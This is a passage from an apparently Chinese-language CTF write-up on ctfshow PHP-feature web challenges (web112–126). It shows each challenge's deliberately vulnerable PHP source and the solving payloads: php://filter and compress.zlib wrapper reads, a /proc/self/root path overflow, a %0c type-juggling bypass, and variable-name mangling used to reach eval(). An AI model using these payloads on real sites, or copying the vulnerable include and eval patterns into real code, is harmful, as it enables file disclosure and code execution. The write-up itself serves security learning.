</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;hacker!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器</p>
<p>如 php://filter（这里也用不到过滤器）</p>
<pre tabindex="0"><code>https://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php
</code></pre><p>其他</p>
<pre tabindex="0"><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
compress.zlib://flag.php
</code></pre><p><strong>为什么不能直接输入flag.php呢?</strong></p>
<pre tabindex="0"><code>if(!is_file($file)){
    highlight_file(filter($file));
}else{
    echo &#34;hacker!&#34;;
}
</code></pre><p>那是因为is_file(&ldquo;flag.php&rdquo;)==true，输出hacker！</p>
<h4 id="web113">web113<a hidden class="anchor" aria-hidden="true" href="#web113">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 23:47:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题相比上题把filter过滤了</p>
<p>我们可以考虑使用其他伪协议</p>
<p>如 compress.zlib://</p>
<pre tabindex="0"><code>compress.zlib://flag.php
</code></pre><p><strong>官方题解</strong> 目录溢出导致is_file认为这不是一个文件</p>
<pre tabindex="0"><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
</code></pre><h4 id="web114">web114<a hidden class="anchor" aria-hidden="true" href="#web114">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:02:53
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;师傅们居然tql都是非预期 哼！&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了</p>
<pre tabindex="0"><code>php://filter/resource=flag.php
</code></pre><p>直接读就完事了</p>
<h4 id="web115">web115<a hidden class="anchor" aria-hidden="true" href="#web115">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-01 15:08:19
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;e&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$num</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="nv">$num</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="nv">$num</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$num</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$num</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">!==</span><span class="s1">&#39;36&#39;</span> <span class="k">and</span> <span class="nx">filter</span><span class="p">(</span><span class="nv">$num</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="s1">&#39;36&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;hacker!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;hacker!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>参考文章:<a href="https://blog.csdn.net/m0_48780534/article/details/125523030">ctfshow学习记录-web入门（php特性109-115&amp;123&amp;125-126）_ctfshow web109-CSDN博客</a></p>
<p>is_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=&lsquo;36&rsquo;</p>
<p>但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的</p>
<p>我们这里考虑使用%0c（换页符）进行绕过</p>
<p>同时使用%0c也可以绕过filter。</p>
<p>接下来再看第二个if判断，这是看起来很矛盾的一个判断。</p>
<p>来具体看一下!==的定义，只要类型不同就不全等。</p>
<p><img alt="php比较" loading="lazy" src="https://i-blog.csdnimg.cn/blog_migrate/fa3b23f0144b0dff5e00bdc93fabdf3b.png"></p>
<blockquote>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。
——《php手册》语言参考-运算符-比较运算符</p></blockquote>
<p>也就是说!==时不进行类型转换。</p>
<p>所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。</p>
<p>payload：</p>
<pre tabindex="0"><code>?num=%0c36
</code></pre><h4 id="web123">web123<a hidden class="anchor" aria-hidden="true" href="#web123">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?/&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">18</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">21</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题其实根本不用理会</p>
<pre tabindex="0"><code>         if($fl0g===&#34;flag_give_me&#34;){
             echo $flag;
         }
</code></pre><p>这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag</p>
<p>这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换</p>
<p>payload:</p>
<pre tabindex="0"><code>POST:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun= echo $flag
</code></pre><h4 id="web125">web125<a hidden class="anchor" aria-hidden="true" href="#web125">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;CTF_SHOW.COM&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;fl0g&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nv">$c</span><span class="o">&lt;=</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">         <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$c</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$fl0g</span><span class="o">===</span><span class="s2">&#34;flag_give_me&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">             <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题把上题的echo方法和flag关键词ban了</p>
<p>考虑通过二次传参的方法读flag</p>
<p>我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了</p>
<p>后面尝试highlight_file方法成功读到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=highlight_file($_GET[1])
GET 1=flag.php
</code></pre><p>其他的 payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">POST</span> <span class="nx">CTF_SHOW</span><span class="o">=&amp;</span><span class="nx">CTF</span><span class="p">[</span><span class="nx">SHOW</span><span class="o">.</span><span class="nx">COM</span><span class="o">=&amp;</span><span class="nx">fun</span><span class="o">=</span><span class="nx">var_export</span><span class="p">(</span><span class="nx">get_defined_vars</span><span class="p">())</span>
</span></span></code></pre></div><h4 id="web126">web126<a hidden class="anchor" aria-hidden="true" href="#web126">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">#
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fun&#39;</span><span class="p">];</span>
